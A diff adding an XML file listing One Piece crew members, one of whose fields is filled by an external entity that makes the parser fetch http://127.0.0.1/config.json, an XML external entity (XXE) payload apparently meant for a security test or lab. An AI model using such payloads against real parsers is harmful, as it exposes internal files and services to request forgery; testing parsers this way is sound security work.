@@ -1,0 +1,24 @@
+<?xml version="1.0"?>
+ <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://127.0.0.1/config.json" >]>
+ <crew>
+   <member id="member1">
+      <name>Edward Newgate</name>
+      <title>Captain</title>
+      <fruit>&xxe;</fruit>
+      <power>A "Quake Man".</power>
+   </member>
+   <member id="member2">
+	  <name>Marco - The Phoenix</name>
+      <title>First Division Commander</title>
+      <fruit>Mythical Zoan type</fruit>
+      <power>Can transform into a phoenix.</power>
+   </member>
+   <member id="member3">
+	  <name>Fire fist - Ace </name>
+      <title>Second Division Commander</title>
+      <fruit>Mera Mera no Mi</fruit>
+      <power>Can create, control, and transform into fire at will.</power>
+   </member>
+</crew>
